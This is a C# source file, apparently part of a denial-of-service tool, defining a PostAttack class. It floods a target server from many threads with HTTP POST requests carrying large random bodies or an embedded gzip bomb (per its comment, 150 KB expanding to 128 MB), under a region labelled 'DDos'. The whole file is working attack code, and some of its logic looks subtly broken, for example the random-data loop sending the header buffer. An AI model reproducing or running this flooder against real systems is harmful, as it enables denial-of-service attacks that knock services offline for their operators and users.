#region Usings
using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

#endregion

namespace GAS.Core.Attacks {
    public class PostAttack : IAttacker {
        #region Variables
        private bool _init;
        private readonly IPAddress _ip;
        private readonly string _dns;
        private readonly string _subsite;
        private readonly bool _random;
        private readonly bool _usegZip;
        private bool _ipOrDns = true;
        private readonly bool _resp;
        private readonly Thread[] _workingThreads;

        private readonly TcpClient[] _workingSockets;

        private volatile string _attackHeader = "";
        private readonly byte[] _gzipBomb = Properties.Resources._256mz;
                                //contains gzipped dump of /dev/zero. gzipped size=150kb, real = 128MB
        #endregion
        public PostAttack(
            string dns,
            string ip,
            int port,
            string subSite,
            bool resp,
            int delay,
            int timeout,
            bool random,
            bool usegzip,
            int threadcount ) {
            this.ThreadCount = threadcount;
            this._workingThreads = new Thread[this.ThreadCount];
            this._workingSockets = new TcpClient[this.ThreadCount];
            this.IsDelayed = false;
            try {
                this._dns = dns;
            }
            catch {
                this._dns = this._ip.ToString();
            }
            try {
                this._ip = IPAddress.Parse( ip );
            }
            catch {
                this._ip = null;
                this._ipOrDns = false;
            }
            this.Port = port;
            this._subsite = subSite;
            this._resp = resp;
            this.Delay = Convert.ToInt32(
                Math.Pow(
                    2,
                    Math.Sqrt( Convert.ToDouble( delay ) ) ) );
            this.Timeout = timeout * 1000;
            this._random = random;
            this._usegZip = usegzip;
            this.States = new ReqState[this.ThreadCount];
        }

        public override void Start() {
            if ( this.IsFlooding )
                this.Stop();
            this.IsDelayed = false;
            this.IsFlooding = true;
            var temp = new StringBuilder( 6000 );
            for (var k = 0; k < 1300; temp.Append( ",5-" + ( k++ ) )) { }
            this._attackHeader = temp.ToString();
            this._init = false;
            for (var i = 0; i < this.ThreadCount; i++)
                ( this._workingThreads[ i ] = new Thread( this.bw_DoWork ) ).Start( i );
            this._init = true;
        }

        private void bw_DoWork( object indexinthreads ) {
            #region Wait 4 init
            while ( !this._init ) Thread.Sleep( 100 );
            var myIndexForWork = (int) indexinthreads;
            #endregion
            try {
                #region Prepare
                this._workingSockets[ myIndexForWork ] = new TcpClient( AddressFamily.InterNetwork );
                const int bfsize = 1024; // this should be less than the MTU
                var recvBuf = new byte[bfsize];
                byte[] buf;
                var rnd = new Random();
                var snd = rnd.Next( 1024 * 1024 * 64 );
                #region Headers
                buf =
                    Encoding.ASCII.GetBytes(
                        String.Format(
                            @"POST {0} HTTP/1.1\_rng\nHost: {1}\_rng\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\_rng\n{2}Content-Type: {3}\_rng\nContent-Length: {4}\_rng\n\_rng\n",
                            this._subsite,
                            this._dns,
                            ( ( this._usegZip ) ? ( "Content-Encoding: gzip" + Environment.NewLine ) : "" ),
                            "application/x-www-form-urlencoded",
                            this._random ? snd : this._gzipBomb.Length ) );
                #endregion
                #endregion
                #region DDos
                while ( this.IsFlooding ) {
                    this.States[ myIndexForWork ] = ReqState.Ready;
                    /*
                    try
                    {
                    WorkingSockets[MY_INDEX_FOR_WORK].Connect(IP, Port);
                    }
                    catch { continue; }
                    if (!WorkingSockets[MY_INDEX_FOR_WORK].Connected)
                    continue;
                    else
                    {
                    var workingSocket = WorkingSockets[MY_INDEX_FOR_WORK].GetStream();
                    workingSocket.
                    }*/
                    #region Old code
                    #region Connect
                    //TcpClient socket = new TcpClient(AddressFamily.InterNetwork);
                    var socket = new Socket(
                        AddressFamily.InterNetwork,
                        SocketType.Stream,
                        ProtocolType.Tcp );
                    this.States[ myIndexForWork ] = ReqState.Connecting;
                    try {
                        socket.Connect(
                            this._ip,
                            this.Port );
                    }
                    catch {
                        continue;
                    }
                    socket.Blocking = this._resp;
                    this.States[ myIndexForWork ] = ReqState.Requesting;
                    if ( socket.Send(
                        buf,
                        SocketFlags.None ) == buf.Length ) //successfully connected
                        #region Upload
                        #region Random data
                        if ( this._random ) {
                            var i = 0;
                            var buflengt = 60000;
                            var sendbuf = new byte[buflengt];
                            try {
                                do {
                                    for (var o = 0; o < buflengt; sendbuf[ o++ ] = (byte) rnd.Next( 255 )) ;
                                } while ( ( i += socket.Send(
                                    buf,
                                    SocketFlags.None ) ) < snd );
                            }
                            catch {}
                        }
                            #endregion
                            #region gzipbomb
                        else {
                            var i = 0; //sent data
                            var sendbuf = new byte[60000]; //send buffer
                            var mb = new MemoryStream( this._gzipBomb ); //stream to gzip bomb for comfortable usage
                            mb.Seek(
                                0,
                                SeekOrigin.Begin );
                            var r = 0; //read data
                            try {
                                do {
                                    mb.Seek(
                                        i,
                                        SeekOrigin.Begin ); //
                                    if ( ( r = mb.Read(
                                        buf,
                                        0,
                                        buf.Length ) ) < buf.Length )
                                        Array.Resize<byte>(
                                            ref buf,
                                            r );
                                } while ( socket.Connected && ( i += socket.Send( buf ) ) < this._gzipBomb.Length );
                            }
                            catch {}
                        }
                        #endregion
                        #endregion
                    #endregion
                    this.States[ myIndexForWork ] = ReqState.Downloading;
                    this.Requested++;
                    #region Download page
                    if ( this._resp )
                        try {
                            socket.Receive( recvBuf );
                            this.Downloaded++;
                        }
                        catch {
                            this.Failed++;
                        }
                    #endregion
                    this.States[ myIndexForWork ] = ReqState.Completed;
                    this.Downloaded++;
                    if ( this.Delay > 0 ) System.Threading.Thread.Sleep( this.Delay );
                    #endregion
                }
                #endregion
            }
            catch {}
        }

        public override void Stop() {
            this.IsFlooding = false;
            try {
                foreach (var x in this._workingThreads)
                    try {
                        x.Abort();
                    }
                    catch {}
            }
            catch {}
        }
    }
}